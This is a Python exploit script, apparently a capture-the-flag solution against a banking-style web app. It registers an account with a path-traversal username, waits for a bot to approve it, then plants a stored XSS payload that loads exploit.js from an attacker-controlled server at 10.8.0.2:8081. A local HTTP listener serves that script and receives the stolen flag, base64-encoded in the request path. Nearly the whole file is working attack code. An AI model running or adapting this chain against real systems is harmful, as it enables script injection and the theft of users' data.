#!/usr/bin/env python3
import requests
import time
import http.server
import base64

url = 'http://societybank.intake:30281'

username = "../../../../"
password = "password"

def make_account():
    # Send a post request with username , password and file
    data = {'username': username, 'password': password}
    files = {'id_file': open('flag.txt', 'rb')}
    r = requests.post(url + '/register', data=data, files=files)
    print(r.status_code)


def login():
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(url + '/login', data={'username': username, 'password': password}, headers=headers,allow_redirects=False)
    if 'Account not approved' in r.text:
        return
    # Get session cookies
    return r.cookies

def sendXSS(cookies):
    # Send a post request with the xss payload
    data = {'message': '<script src="http://10.8.0.2:8081/exploit.js"></script>', 'amount': 10}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(url + '/deposit', data=data, cookies=cookies, headers=headers)
    print(r.status_code)


def handler(*args):
    # Handle the request to serve the exploit.js file as well as the response
    class MyHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/exploit.js':
                self.send_response(200)
                self.send_header('Content-type', 'text/javascript')
                self.end_headers()
                with open('exploit.js', 'rb') as f:
                    self.wfile.write(f.read())
            else:
                # Get the flag from the path
                path = self.path.split('/')[1]
                print(path)
                # Base 64 decode the flag
                flag = base64.b64decode(path).decode()
                if 'Intake' in flag:
                    print("Flag: ", flag)
                    exit(0)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'ty for the flag')
    return MyHandler(*args)

def start_server():
    # Start a local server to serve the exploit.js file
    with http.server.HTTPServer(('', 8081), handler) as httpd:
        print("serving at port", 8081)
        httpd.serve_forever()
    
# Start server as a separate thread
import threading
t = threading.Thread(target=start_server)
t.start()

cookies = login()
if cookies:
    # Start a local server to serve the exploit.js file
    print('Sending XSS')
    sendXSS(cookies)
else:
    print('Making account')
    make_account()
    # Wait for the bot to approve the account
    time.sleep(85)
    cookies = login()
    if cookies:
        # Start a local server to serve the exploit.js file
        print('Sending XSS')
        sendXSS(cookies)
    else:
        print('Account not approved yet')
        
